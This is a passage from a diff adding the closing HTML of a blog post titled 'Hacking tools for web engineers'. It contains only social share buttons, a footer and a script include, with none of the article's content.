+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Hacking%20tools%20for%20web%20engineers&amp;caption=Hacking%20tools%20for%20web%20engineers&amp;canonicalUrl=https%3a%2f%2fnotsag-dev.github.io%2fposts%2fhacking-tools-for-web-engineers%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=Hacking%20tools%20for%20web%20engineers&amp;body=https%3a%2f%2fnotsag-dev.github.io%2fposts%2fhacking-tools-for-web-engineers%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fnotsag-dev.github.io%2fposts%2fhacking-tools-for-web-engineers%2f&amp;media=https%3a%2f%2fnotsag-dev.github.io%2fposts%2fhacking-tools-for-web-engineers%2f;description=Hacking%20tools%20for%20web%20engineers" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fnotsag-dev.github.io%2fposts%2fhacking-tools-for-web-engineers%2f&amp;title=Hacking%20tools%20for%20web%20engineers&amp;summary=Hacking%20tools%20for%20web%20engineers&amp;source=https%3a%2f%2fnotsag-dev.github.io%2fposts%2fhacking-tools-for-web-engineers%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fnotsag-dev.github.io%2fposts%2fhacking-tools-for-web-engineers%2f&amp;resubmit=true&amp;title=Hacking%20tools%20for%20web%20engineers" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fnotsag-dev.github.io%2fposts%2fhacking-tools-for-web-engineers%2f;title=Hacking%20tools%20for%20web%20engineers" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=Hacking%20tools%20for%20web%20engineers%20https%3a%2f%2fnotsag-dev.github.io%2fposts%2fhacking-tools-for-web-engineers%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fnotsag-dev.github.io%2fposts%2fhacking-tools-for-web-engineers%2f&amp;t=Hacking%20tools%20for%20web%20engineers" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Hacking%20tools%20for%20web%20engineers&amp;url=https%3a%2f%2fnotsag-dev.github.io%2fposts%2fhacking-tools-for-web-engineers%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+            
+                <span>☠</span>
+            
+            <span> <a href="https://notsag-dev.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Montevideo</span>
+            <span>Uruguay</span>
+          </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+    </body>
+</html>
